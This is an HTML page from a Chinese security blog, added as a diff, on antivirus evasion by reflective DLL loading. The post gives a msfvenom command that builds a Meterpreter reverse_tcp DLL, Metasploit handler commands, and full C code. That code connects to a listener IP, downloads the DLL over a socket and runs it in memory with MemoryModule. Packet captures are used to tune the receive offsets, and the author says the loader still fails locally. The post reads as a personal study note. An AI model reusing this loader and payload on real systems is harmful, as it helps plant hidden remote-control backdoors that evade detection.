@@ -1,0 +1,684 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="Glacier">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="静态恶意代码逃逸2最近在学习从底层去实现免杀，而看到了关于静态恶意代码逃逸的一些很好的文章，在此记录总结一下">
+<meta property="og:type" content="article">
+<meta property="og:title" content="静态恶意代码逃逸2">
+<meta property="og:url" content="https://silver-glacier.github.io/2022/10/19/%E9%9D%99%E6%80%81%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E9%80%83%E9%80%B82/index.html">
+<meta property="og:site_name" content="Glacier&#39;s Blog">
+<meta property="og:description" content="静态恶意代码逃逸2最近在学习从底层去实现免杀，而看到了关于静态恶意代码逃逸的一些很好的文章，在此记录总结一下">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://s2.loli.net/2022/10/19/HcQtfh9rgeM2WnE.png">
+<meta property="og:image" content="https://s2.loli.net/2022/10/19/V5DHfw4bZvESp3e.png">
+<meta property="og:image" content="https://s2.loli.net/2022/10/19/iqyYWgurDmvsUwo.png">
+<meta property="og:image" content="https://s2.loli.net/2022/10/19/KhkV8u67fbEnmT2.png">
+<meta property="og:image" content="https://s2.loli.net/2022/10/19/L16PqxFlEQceCXb.png">
+<meta property="og:image" content="https://s2.loli.net/2022/10/19/M9GxW8vS7lnUaPI.png">
+<meta property="og:image" content="https://s2.loli.net/2022/10/19/UQd953TlzMeXkKA.png">
+<meta property="og:image" content="https://s2.loli.net/2022/10/19/APHegd1Fp2vu3yB.png">
+<meta property="og:image" content="https://s2.loli.net/2022/10/19/AZXYbaGMgD7Pszh.png">
+<meta property="article:published_time" content="2022-10-19T12:49:24.000Z">
+<meta property="article:modified_time" content="2022-10-19T12:47:37.313Z">
+<meta property="article:author" content="Glacier">
+<meta property="article:tag" content="免杀">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://s2.loli.net/2022/10/19/HcQtfh9rgeM2WnE.png">
+  
+  
+  
+  <title>静态恶意代码逃逸2 - Glacier&#39;s Blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"silver-glacier.github.io","root":"/","version":"1.9.3","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 5.2.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Fluid</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="静态恶意代码逃逸2"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2022-10-19 20:49" pubdate>
+          2022年10月19日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          4.8k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          40 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">静态恶意代码逃逸2</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="静态恶意代码逃逸2"><a href="#静态恶意代码逃逸2" class="headerlink" title="静态恶意代码逃逸2"></a>静态恶意代码逃逸2</h1><p>最近在学习从底层去实现免杀，而看到了关于静态恶意代码逃逸的一些很好的文章，在此记录总结一下</p>
+<a id="more"></a>
+
+<h3 id="反射DLL加载"><a href="#反射DLL加载" class="headerlink" title="反射DLL加载"></a>反射DLL加载</h3><p>对于加载DLL而言，一般是通过LoadLibrary这个API来实现，但这里我们去使用memoryModule<br><a href="https://silver-glacier.github.io/2022/10/18/MemoryModule%E7%9A%84%E5%AD%A6%E4%B9%A0/">前置知识</a></p>
+<p>将该项目下载之后，主要使用的是<code>MemoryModule.h、MemoryModule.cpp</code>文件</p>
+<p>记录一下报错信息与处理<br><code>wcsncpy: This function or variable may be unsafe. Consider using wcsncpy_s instead. To disable deprecation, use _CRT_SECURE_NO_WARNINGS. See online help for details.</code></p>
+<blockquote>
+<p>处理方法：项目属性 -&gt; C/C++ -&gt; 预处理器 -&gt; 预处理器定义中加上<code>_CRT_SECURE_NO_WARNINGS</code><br>网上说在头部加上 <code>#define _CRT_SECURE_NO_WARNINGS</code>宏编译也能解决问题，但我在这里实测不行</p>
+</blockquote>
+<p><code>MemoryLoadLibrary：函数不接受一个参数</code></p>
+<blockquote>
+<p>处理方法： 将原语句改为<code>hModule = MemoryLoadLibrary(bFileBuffer, dwReadOfFileSize);</code></p>
+</blockquote>
+<p><code>链接器工具错误 LINK 2001</code></p>
+<blockquote>
+<p>处理方法： 生成的def文件与source.cpp文件名不一致</p>
+</blockquote>
+<h4 id="反射DLL与MSF"><a href="#反射DLL与MSF" class="headerlink" title="反射DLL与MSF"></a>反射DLL与MSF</h4><p>首先利用MSF来生成一个DLL，然后通过网络套接字（Socket）接受，丢到MemoryModule中，让其执行<br><code>msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.152.129 LPORT=8899 -f dll -o shellcode.dll</code></p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs awk">handler -p windows<span class="hljs-regexp">/x64/m</span>eterpreter/reverse_tcp -H <span class="hljs-number">192.168</span>.<span class="hljs-number">152.129</span> -P <span class="hljs-number">8899</span><br>use exploit<span class="hljs-regexp">/multi/</span>handler <br>set payload windows<span class="hljs-regexp">/patchupdllinject/</span>reverse_tcp<br>set dll shellcode.dll<br></code></pre></td></tr></table></figure>
+
+
+<p>这里直接贴上客户端代码，这个代码还是很值得学习的</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;WinSock2.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;Windows.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;MemoryModule.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(lib,<span class="hljs-meta-string">&quot;ws2_32.lib&quot;</span>)</span><br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> PAYLOAD_SIZE 1024*512</span><br><span class="hljs-function"><span class="hljs-keyword">typedef</span> <span class="hljs-title">BOOL</span> <span class="hljs-params">(*Module)</span><span class="hljs-params">(HMODULE hModule, DWORD ul_reason_for_call , LPVOID lpReserved)</span></span>;<br><br><span class="hljs-function"><span class="hljs-keyword">typedef</span> <span class="hljs-title">VOID</span> <span class="hljs-params">(*msg)</span><span class="hljs-params">(VOID)</span></span>;<br>PBYTE bFileBuffer = <span class="hljs-literal">NULL</span>;<br><br><br><span class="hljs-function">BOOL <span class="hljs-title">GetPEDLL</span><span class="hljs-params">()</span></span>&#123;<br>	<br>	DWORD dwError;<br>	WORD sockVersion = MAKEWORD(<span class="hljs-number">2</span>, <span class="hljs-number">2</span>);<br>	WSADATA wsaData;<br>	SOCKET socks;<br>	SHORT sListenPort = <span class="hljs-number">8888</span>;<br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sockaddr_in</span> <span class="hljs-title">sin</span>;</span><br><br>	<span class="hljs-keyword">if</span> (WSAStartup(sockVersion, &amp;wsaData) != <span class="hljs-number">0</span>)<br>	&#123;<br>		dwError = GetLastError();<br>		<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[*]WSAStarup Error : %d \n&quot;</span>,dwError);<br>		<span class="hljs-keyword">return</span> FALSE;<br>	&#125;<br>	<br>	socks = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);<br><br>	<span class="hljs-keyword">if</span> (socks == INVALID_SOCKET)<br>	&#123;<br>		dwError = GetLastError();<br>		<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[*]Socket Error : %d \n&quot;</span>,dwError);<br>		<span class="hljs-keyword">return</span> FALSE;<br>	&#125;<br><br>	<span class="hljs-built_in">sin</span>.sin_family = AF_INET;<br>	<span class="hljs-built_in">sin</span>.sin_port = htons(sListenPort);<br>	<span class="hljs-built_in">sin</span>.sin_addr.S_un.S_addr = inet_addr(<span class="hljs-string">&quot;192.168.170.138&quot;</span>);<br><br>	<span class="hljs-keyword">if</span>(connect(socks,(struct sockaddr *)&amp;<span class="hljs-built_in">sin</span>,<span class="hljs-keyword">sizeof</span>(<span class="hljs-built_in">sin</span>)) == SOCKET_ERROR )<br>	&#123;<br>		dwError = GetLastError();<br>		<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[*]Bind Error : %d \n&quot;</span>,dwError);<br>		<span class="hljs-keyword">return</span> FALSE;<br>	&#125;<br>	<br>	<span class="hljs-keyword">int</span> ret = <span class="hljs-number">0</span>;<br>	ret = recv(socks,(PCHAR)bFileBuffer,<span class="hljs-number">4</span>,<span class="hljs-literal">NULL</span>);<br>	ret = recv(socks,(PCHAR)bFileBuffer,<span class="hljs-number">2650</span>,<span class="hljs-literal">NULL</span>);<br>	ret = recv(socks,(PCHAR)bFileBuffer,<span class="hljs-number">4</span>,<span class="hljs-literal">NULL</span>);<br>	ret = recv(socks,(PCHAR)bFileBuffer,<span class="hljs-number">4</span>,<span class="hljs-literal">NULL</span>);<br>	ret = recv(socks,(PCHAR)bFileBuffer,<span class="hljs-number">4</span>,<span class="hljs-literal">NULL</span>);<br><br>	ZeroMemory(bFileBuffer,PAYLOAD_SIZE);<br><br>	<br>	ret = recv(socks,(PCHAR)bFileBuffer,<span class="hljs-number">5120</span>,<span class="hljs-literal">NULL</span>);<br><br>	<span class="hljs-keyword">if</span> (ret &gt; <span class="hljs-number">0</span>)<br>	&#123;<br>		closesocket(socks);<br>	&#125;<br><br><br>	<span class="hljs-keyword">return</span> TRUE;<br>&#125; <br><br><span class="hljs-comment">// 打开文件并获取大小</span><br><span class="hljs-function">DWORD <span class="hljs-title">OpenBadCodeDLL</span><span class="hljs-params">(HANDLE &amp; hBadCodeDll, LPCWSTR lpwszBadCodeFileName)</span></span>&#123;<br>	DWORD dwHighFileSize = <span class="hljs-number">0</span>;<br>	DWORD dwLowFileSize = <span class="hljs-number">0</span>;<br>	<span class="hljs-comment">// 打开文件</span><br>	hBadCodeDll = CreateFile(lpwszBadCodeFileName,GENERIC_READ,FILE_SHARE_READ,<span class="hljs-literal">NULL</span>,OPEN_ALWAYS,FILE_ATTRIBUTE_NORMAL ,<span class="hljs-literal">NULL</span>);<br>	<span class="hljs-keyword">if</span>(hBadCodeDll == INVALID_HANDLE_VALUE)&#123;<br>		<span class="hljs-keyword">return</span> GetLastError();<br>	&#125;<br>	dwLowFileSize = GetFileSize(hBadCodeDll,&amp;dwHighFileSize);<br>	<span class="hljs-keyword">return</span> dwLowFileSize;<br>&#125;<br><br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>	<br>	HMEMORYMODULE hModule;<br>	Module DllMain;<br>	bFileBuffer = <span class="hljs-keyword">new</span> BYTE[PAYLOAD_SIZE];<br>	GetPEDLL();<br>	<span class="hljs-comment">// 导入PE文件</span><br>	hModule = MemoryLoadLibrary(bFileBuffer);<br>	<span class="hljs-comment">// 如果加载失败，就退出</span><br>	<span class="hljs-keyword">if</span>(hModule == <span class="hljs-literal">NULL</span>)&#123;<br>		<span class="hljs-keyword">delete</span> [] bFileBuffer;<br>		<span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>	&#125;<br>	<span class="hljs-comment">// 获取msg导出函数地址</span><br>	DllMain = (Module)MemoryGetProcAddress(hModule,<span class="hljs-string">&quot;DllMain&quot;</span>);<br>	<span class="hljs-comment">// 运行msg函数</span><br>	DllMain(<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>);<br>	<span class="hljs-comment">// 释放资源</span><br>	DWORD dwThread;<br>	HANDLE hThread = CreateThread(<span class="hljs-literal">NULL</span>,<span class="hljs-literal">NULL</span>,(LPTHREAD_START_ROUTINE)DllMain,<span class="hljs-literal">NULL</span>,<span class="hljs-literal">NULL</span>,&amp;dwThread);<br>	<br>	WaitForSingleObject(hThread,INFINITE);<br>	<br>	MemoryFreeLibrary(hModule);<br>	<span class="hljs-comment">// 释放PE内存</span><br>	<span class="hljs-keyword">delete</span> [] bFileBuffer;<br>	<span class="hljs-keyword">return</span> GetLastError();<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>其中比较难以理解的就是GetPEDLL函数中的这一部分</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">int</span> ret = <span class="hljs-number">0</span>;<br>	ret = recv(socks,(PCHAR)bFileBuffer,<span class="hljs-number">4</span>,<span class="hljs-literal">NULL</span>);<br>	ret = recv(socks,(PCHAR)bFileBuffer,<span class="hljs-number">2650</span>,<span class="hljs-literal">NULL</span>);<br>	ret = recv(socks,(PCHAR)bFileBuffer,<span class="hljs-number">4</span>,<span class="hljs-literal">NULL</span>);<br>	ret = recv(socks,(PCHAR)bFileBuffer,<span class="hljs-number">4</span>,<span class="hljs-literal">NULL</span>);<br>	ret = recv(socks,(PCHAR)bFileBuffer,<span class="hljs-number">4</span>,<span class="hljs-literal">NULL</span>);<br><br>	ZeroMemory(bFileBuffer,PAYLOAD_SIZE);<br><br>	<br>	ret = recv(socks,(PCHAR)bFileBuffer,<span class="hljs-number">5120</span>,<span class="hljs-literal">NULL</span>);<br></code></pre></td></tr></table></figure>
+<p>首先是recv()这个函数<br>函数原型<code>int recv( _In_ SOCKET s, _Out_ char *buf, _In_ int len, _In_ int flags);</code><br>该函数的主要作用是将接收到的内容存到第二个参数所指向的缓冲区</p>
+<p><img src="https://s2.loli.net/2022/10/19/HcQtfh9rgeM2WnE.png" srcset="/img/loading.gif" lazyload alt="msf"><br>连接msf成功，传输stage 2650bytes,传输dll 8712bytes，但这仍然无法解释上述的recv代码的偏移量<br>于是我想到拿wireshark去抓包分析一下，看看msf一共传输了哪些东西<br>过滤掉源IP与目的IP之后，得到如下的TCP传输<br><img src="https://s2.loli.net/2022/10/19/V5DHfw4bZvESp3e.png" srcset="/img/loading.gif" lazyload alt="wireshark"><br>那我们就挨个来看一下这些包有多大，以及具体内容</p>
+<p>一共2658bytes<br><img src="https://s2.loli.net/2022/10/19/iqyYWgurDmvsUwo.png" srcset="/img/loading.gif" lazyload alt="4bytes"><br><img src="https://s2.loli.net/2022/10/19/KhkV8u67fbEnmT2.png" srcset="/img/loading.gif" lazyload alt="1460bytes"><br><img src="https://s2.loli.net/2022/10/19/L16PqxFlEQceCXb.png" srcset="/img/loading.gif" lazyload alt="1194bytes"></p>
+<p>一共8712bytes<br><img src="https://s2.loli.net/2022/10/19/M9GxW8vS7lnUaPI.png" srcset="/img/loading.gif" lazyload alt="7300bytes"><br><img src="https://s2.loli.net/2022/10/19/UQd953TlzMeXkKA.png" srcset="/img/loading.gif" lazyload alt="1412bytes"></p>
+<p>于是将上述代码改为</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">int</span> ret = <span class="hljs-number">0</span>;<br>	ret = recv(socks, (PCHAR)bFileBuffer, <span class="hljs-number">4</span>, <span class="hljs-literal">NULL</span>);<br>	ret = recv(socks, (PCHAR)bFileBuffer, <span class="hljs-number">2650</span>, <span class="hljs-literal">NULL</span>);<br>	ret = recv(socks, (PCHAR)bFileBuffer, <span class="hljs-number">4</span>, <span class="hljs-literal">NULL</span>);<br><br>	ZeroMemory(bFileBuffer, PAYLOAD_SIZE);<br>	<br>	ret = recv(socks, (PCHAR)bFileBuffer, <span class="hljs-number">8712</span>, <span class="hljs-literal">NULL</span>);<br></code></pre></td></tr></table></figure>
+<p>但貌似还是没有成功上线</p>
+<p>当我一个一个包仔细看的时候，突然想到，在msfvenom生成的时候，会带有dll大小的具体信息，于是重新生成一个dll来看<br><img src="https://s2.loli.net/2022/10/19/APHegd1Fp2vu3yB.png" srcset="/img/loading.gif" lazyload alt="msfvenom生成dll"><br>这里可以看到dll大小为8704bytes<br>重新抓包分析</p>
+<p><img src="https://s2.loli.net/2022/10/19/AZXYbaGMgD7Pszh.png" srcset="/img/loading.gif" lazyload><br>可以看到dll文件数据由7300+1416=8716bytes构成，意味着有12bytes需要偏移</p>
+<p>于是将代码改为</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">int</span> ret = <span class="hljs-number">0</span>;<br>ret = recv(socks, (PCHAR)bFileBuffer, <span class="hljs-number">4</span>, <span class="hljs-literal">NULL</span>);<br>ret = recv(socks, (PCHAR)bFileBuffer, <span class="hljs-number">2650</span>, <span class="hljs-literal">NULL</span>);<br>ret = recv(socks, (PCHAR)bFileBuffer, <span class="hljs-number">12</span>, <span class="hljs-literal">NULL</span>);<br><br>ZeroMemory(bFileBuffer, PAYLOAD_SIZE);<br><br>ret = recv(socks, (PCHAR)bFileBuffer, <span class="hljs-number">8704</span>, <span class="hljs-literal">NULL</span>);<br></code></pre></td></tr></table></figure>
+<p>这样应该就没问题了，但我本地尝试复现，却一直无法上线，尝试了多种方法，无法解决，那就留个坑在这里</p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/%E5%85%8D%E6%9D%80/" class="category-chain-item">免杀</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/%E5%85%8D%E6%9D%80/">#免杀</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>静态恶意代码逃逸2</div>
+      <div>https://silver-glacier.github.io/2022/10/19/静态恶意代码逃逸2/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>Glacier</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2022年10月19日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2022/10/18/MemoryModule%E7%9A%84%E5%AD%A6%E4%B9%A0/" title="MemoryModule的学习">
+                        <span class="hidden-mobile">MemoryModule的学习</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
